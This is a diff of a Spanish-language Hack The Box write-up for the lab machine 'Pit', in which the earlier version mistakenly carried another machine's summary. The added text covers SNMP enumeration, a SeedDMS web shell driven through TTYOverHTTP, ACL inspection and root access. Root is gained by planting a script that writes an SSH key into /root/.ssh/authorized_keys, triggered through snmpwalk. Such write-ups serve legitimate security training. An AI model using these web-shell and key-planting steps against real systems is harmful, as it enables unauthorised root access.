@@ -1,8 +1,12 @@
 ---
 layout: single
 title: Hack The Box - Pit 
-excerpt: "Es una máquina fácil de Hack The Box que presenta un portal web con funcionalidad de carga de archivos. Dichos archivos se almacenan en un recurso compartido, lo que permite aprovechar la carga de un archivo .scf para obtener un hash y acceder al sistema. Posteriormente, para la escalación de privilegios, se explota la vulnerabilidad PrintNightmare, logrando la ejecución de comandos con privilegios de administrador."
-date: 2025-11-03
+excerpt: "Pit es una máquina de dificultad media en Hack The Box. El objetivo inicial consiste en enumerar el servicio SNMP para obtener información que pueda servir como vector de ataque, como la ruta de acceso al login del servicio web y dos posibles usuarios. Una vez obtenido acceso al portal web, se explota una vulnerabilidad en el sistema de file upload, que permite la ejecución remota de comandos y la obtención de una shell.
+
+Se utiliza TTYOverHTTP para obtener una shell más estable y con más control, lo que permite realizar un tratamiento adecuado y obtener credenciales para acceder al servicio web en el puerto 9090. Este servicio cuenta con una opción de terminal que facilita la ejecución de comandos.
+
+Para la escalada de privilegios, se debe revisar la enumeración del servicio SNMP, ya que revela la ejecución de un script. Al analizar dicho script y utilizando getfacl, es posible escalar privilegios"
+date: 2025-11-05
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-Pit/pit.png
@@ -12,9 +16,12 @@ categories:
   - Hack The Box
   - Web Pentesting
 tags:  
-  - scf
-  - PrintNightmare
-  - Windows
+  - Linux
+  - SeedDMS
+  - SNMP
+  - TtyOverHttp
+  - ACLs (Access Control List) - getfacl
+  - sshkeygen 
 
 ---
 <style>
@@ -144,7 +151,11 @@ tags:
 
 <br>
 
-`Driver` Es una máquina fácil de Hack The Box que presenta un portal web con funcionalidad de carga de archivos. Dichos archivos se almacenan en un recurso compartido, lo que permite aprovechar la carga de un archivo .scf para obtener un hash y acceder al sistema. Posteriormente, para la escalación de privilegios, se explota la vulnerabilidad PrintNightmare, logrando la ejecución de comandos con privilegios de administrador. 
+`Pit` es una máquina de dificultad media en Hack The Box. El objetivo inicial consiste en enumerar el servicio SNMP para obtener información que pueda servir como vector de ataque, como la ruta de acceso al login del servicio web y dos posibles usuarios. Una vez obtenido acceso al portal web, se explota una vulnerabilidad en el sistema de file upload, que permite la ejecución remota de comandos y la obtención de una shell.
+
+Se utiliza TTYOverHTTP para obtener una shell más estable y con más control, lo que permite realizar un tratamiento adecuado y obtener credenciales para acceder al servicio web en el puerto 9090. Este servicio cuenta con una opción de terminal que facilita la ejecución de comandos.
+
+Para la escalada de privilegios, se debe revisar la enumeración del servicio SNMP, ya que revela la ejecución de un script. Al analizar dicho script y utilizando getfacl, es posible escalar privilegios
 
 ## Enumeración
 
@@ -166,6 +177,7 @@ PORT     STATE SERVICE         REASON         VERSION
 ```
 Realicé otro escaneo con Nmap utilizando la opción `-sVC` para obtener más información de los servicios identificados y pude obtener el dominio: `dms-pit.htb`
 
+![](/assets/images/htb-writeup-Pit/svcpng)
 
 Posteriormente, agregué el dominio `dms-pit.htb` y `pit.htb` al archivo `/etc/hosts`, apuntándolo a la IP de la máquina víctima, para futuros ataques.
 
@@ -332,13 +344,15 @@ Para que funcione se debe agregar la ruta donde reside la web shell en el archiv
 result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
 result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
 ```
+El archivo modificado se encuentra en [TTYOverHTTP_Modificada]()
 
 ```bash
 ┌──(root㉿kali)-[/opt/ttyoverhttp]
-└─# python3 tty_over_http.py    
+└─# rlwrap python3 tty_over_http.py    
 > whoami
 > nginx
 ```
+`NOTA:` Se agrega rlwrap para que permita ejecuta CTRL + L subir y bajar con las flechas, etc.
 
 Una vez ejecutado, realizando una enumeración me encontré con un archivo interesante `settings.xml` del cual identifique credenciales
 
@@ -406,6 +420,8 @@ done
 [michelle@pit ~]$ 
 ```
 
+Se trata de un script que ejecuta todos los scripts que esten dentro de /usr/local/monitoring/ y tengan de nombre check_cual_quier_cosa terminando en .sh (Por el uso del wildcard )
+
 Situándome en el directorio `/usr/bin/monitor` no me deja listar los archivos sin embargo si pude crear uno
 
 ```bash
@@ -419,7 +435,26 @@ ls: cannot open directory '.': Permission denied
 [michelle@pit monitoring]$ cat test
 test
 ```
-Al ejecutar revisar los permisos del directorio monitoring veo que tiene un `+` lo cual significa que este directorio tiene ACLs (Access Control List) adicionales así que ejecute el comando  `getfacl` y pude ver que el usuario `michelle` tiene permisos de escritura y ejecución en el directorio `monitoring` lo cual justifica por que puedo crear archivos
+
+Al revisar los permisos del directorio monitoring veo que tiene un `+` lo cual significa que este directorio tiene ACLs (Access Control List) adicionales así que ejecute el comando  `getfacl` y pude ver que el usuario `michelle` tiene permisos de escritura y ejecución en el directorio `monitoring` lo cual justifica por que puedo crear archivos
+
+```bash
+[michelle@pit local]$ ls -la
+total 0
+drwxr-xr-x. 13 root root 149 Nov  3  2020 .
+drwxr-xr-x. 12 root root 144 May 10  2021 ..
+drwxr-xr-x.  2 root root   6 Nov  3  2020 bin
+drwxr-xr-x.  2 root root   6 Nov  3  2020 etc
+drwxr-xr-x.  2 root root   6 Nov  3  2020 games
+drwxr-xr-x.  2 root root   6 Nov  3  2020 include
+drwxr-xr-x.  2 root root   6 Nov  3  2020 lib
+drwxr-xr-x.  3 root root  17 May 10  2021 lib64
+drwxr-xr-x.  2 root root   6 Nov  3  2020 libexec
+drwxrwx---+  2 root root 101 Nov  5 15:05 monitoring
+drwxr-xr-x.  2 root root   6 Nov  3  2020 sbin
+drwxr-xr-x.  5 root root  49 Nov  3  2020 share
+drwxr-xr-x.  2 root root   6 Nov  3  2020 src
+``` 
 
 ```bash
 [michelle@pit local]$ getfacl monitoring/
@@ -435,4 +470,92 @@ other::---
 [michelle@pit local]$ 
 ```
 
+Posteriormente cree un par de llaves ssh y un script que almacene dentro de /usr/local/monitoring/ el cual le da un echo a mi llave publica y la almacena en /root/.ssh/authorized_keys también imprime el mensaje it worked! si funciono la instrucción anterior para cerciorarme que se ejecuto correctamente 
 
+```bash
+┌──(root㉿kali)-[~/.ssh]
+└─# ssh-keygen 
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/root/.ssh/id_ed25519): 
+Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_ed25519
+Your public key has been saved in /root/.ssh/id_ed25519.pub
+The key fingerprint is:
+SHA256:dPY9ZMvUK3z7AzEg4Qc8vNO76LFrs9VddGgzMoxduRg root@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|        oo.   .. |
+|        .=.=E..o |
+|        ..O.*oO.+|
+|       . =.oo%.=o|
+|        S . ooBo.|
+|           ...+.o|
+|         ......o |
+|         ++.   ..|
+|        o=+     o|
++----[SHA256]-----+
+```
+
+```bash
+┌──(root㉿kali)-[~/.ssh]
+└─# cat check_p3rr1n.sh 
+#!/bin/bash
+
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWUP8z0hPaS//nzHmsf4ggIWfseFakjvr3FFBWDHNwj root@kali' > /root/.ssh/authorized_keys && echo "SrP3rr1n" 
+```
+
+Para activar su ejecución ejecute lo siguiente:
+
+```bash
+snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
+```
+
+NOTA: Si muestra el mensaje de error `NET-SNMP-EXTEND-MIB::nsExtendObjects: Unknown Object Identifier` realizar la siguiente instalación `apt-get install snmp-mibs-downloader`
+
+```bash
+┌──(root㉿kali)-[~/.ssh]
+└─# snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
+NET-SNMP-EXTEND-MIB::nsExtendCommand."memory" = STRING: /usr/bin/free
+NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
+NET-SNMP-EXTEND-MIB::nsExtendArgs."memory" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."memory" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."memory" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."memory" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."memory" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."memory" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."memory" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."memory" = STRING:               total        used        free      shared  buff/cache   available
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Database status
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."memory" = STRING:               total        used        free      shared  buff/cache   available
+Mem:        4023500      568920     3125676        8824      328904     3222096
+Swap:       1961980           0     1961980
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Database status
+OK - Connection to database successful.
+SrP3rr1n
+System release info
+CentOS Linux release 8.3.2011
+SELinux Settings
+user
+...SNIP...
+```
+La ejecución mostro el texto `SrP3rr1n` por lo cual funciono, por ultimo inicie sesión como root con mi llave privada 
+
+```bash
+┌──(root㉿kali)-[~/.ssh]
+└─# ssh -i id_ed25519 root@10.10.10.241                                     
+Web console: https://pit.htb:9090/ or https://10.10.10.241:9090/
+
+Last login: Thu Nov  3 06:15:20 2022
+[root@pit ~]# whoami
+root
+[root@pit ~]# 
+```
